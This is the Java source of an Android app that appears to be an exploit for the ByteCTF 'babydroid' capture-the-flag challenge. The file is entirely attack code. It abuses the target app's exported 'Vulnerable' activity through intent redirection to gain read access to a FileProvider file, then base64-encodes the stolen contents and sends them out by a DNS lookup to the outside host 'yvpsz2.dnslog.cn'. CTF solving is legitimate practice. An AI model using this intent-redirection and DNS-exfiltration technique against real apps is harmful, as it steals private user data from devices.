package com.bytectf.pwnbabydroid;

import androidx.appcompat.app.AppCompatActivity;

import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;

import java.io.IOException;
import java.io.InputStream;
import java.net.InetAddress;
import java.util.Base64;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        if(getIntent().getAction().equals("exp")){
            Uri data = getIntent().getData();

            try {
                InputStream i = getContentResolver().openInputStream(data);
                byte[] bytes = new byte[i.available()];
                i.read(bytes);
                String str = new String(bytes);
//         String str ="bytectf{aaaaaaaaaaaaaaaa}";

                String base64encodedString = Base64.getEncoder().encodeToString(str.getBytes("utf-8"));
                String result = base64encodedString.replace('=', '_');

                String dnslog = "yvpsz2.dnslog.cn";
                InetAddress.getByName( result + "." + dnslog);

            }catch (IOException E){

            }
        }else{
            Intent exp = new Intent("exp");
            exp.setClassName(getPackageName(),MainActivity.class.getName());
            exp.setData(Uri.parse("content://androidx.core.content.FileProvider/" +
                    "files/flag"));
            exp.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
            Intent intent = new Intent();
            intent.setClassName("com.bytectf.babydroid","com.bytectf.babydroid.Vulnerable");
            intent.putExtra("intent",exp);
            startActivity(intent);

        }

    }
}